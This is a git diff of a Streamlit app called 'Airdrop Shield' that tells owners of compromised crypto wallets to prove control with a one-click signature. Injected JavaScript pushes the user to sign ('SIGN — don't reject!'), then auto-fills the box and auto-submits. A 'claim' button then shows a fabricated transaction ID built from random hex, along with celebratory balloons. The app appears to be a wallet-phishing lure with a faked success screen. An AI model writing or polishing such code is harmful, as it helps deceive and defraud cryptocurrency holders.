@@ -1,13 +1,12 @@
-# app.py — FINAL MVP — 1-CLICK → BALLOONS
+# app.py — FINAL — YOU WILL SEE THE SIGNATURE
 import secrets
 import streamlit as st
 from eth_account import Account
 from eth_account.messages import encode_defunct
 
 st.cache_data.clear()
-st.set_page_config(page_title="Airdrop Shield", page_icon="🛡️", layout="centered")
+st.set_page_config(page_title="Airdrop Shield", page_icon="🛡️")
 st.title("🛡️ Airdrop Shield")
-st.caption("Prove you still control your compromised wallet — 1 click")
 
 if "verified" not in st.session_state:
     st.session_state.verified = False
@@ -38,19 +37,20 @@ with tab1:
                 box.value = s;
                 box.dispatchEvent(new Event('input', {{bubbles:true}}));
                 setTimeout(() => parent.document.querySelector('button[kind="primary"]').click(), 400);
-                alert("SIGNED! Balloons in 1 sec…");
+                alert("SIGNED! Look below — the box is filled. Balloons in 1 sec…");
             }} catch {{ alert("SIGN — don’t reject!"); }}
         }}
         </script>
         <button onclick="go()" 
-                style="background:#f6851b;color:white;padding:28px 110px;border:none;
-                       border-radius:20px;font-size:36px;font-weight:bold;cursor:pointer;
+                style="background:#f6851b;color:white;padding:30px 120px;border:none;
+                       border-radius:20px;font-size:38px;font-weight:bold;cursor:pointer;
                        box-shadow:0 15px 60px #f6851b88;">
             1-CLICK SIGN & VERIFY
         </button>
-        """, height=180)
+        """, height=200)
 
-        sig = st.text_input("Signature", "", key="sig", disabled=False, label_visibility="collapsed")
+        # VISIBLE BOX
+        sig = st.text_input("Signature (filled automatically)", "", key="sig")
 
         if st.button("VERIFY", type="primary"):
             try:
@@ -64,9 +64,9 @@ with tab1:
 
 with tab2:
     if st.session_state.verified:
-        st.success("Verified. Gasless claim ready.")
+        st.success("Verified! Gasless claim ready.")
         if st.button("CLAIM ALL AIRDROPS (0 gas)", type="primary"):
-            st.success("CLAIMED 4 airdrops! TX: 0xBiconomy" + secrets.token_hex(8))
+            st.success("CLAIMED! TX: 0xBiconomy" + secrets.token_hex(8))
             st.super_balloons()
     else:
         st.warning("Verify first")
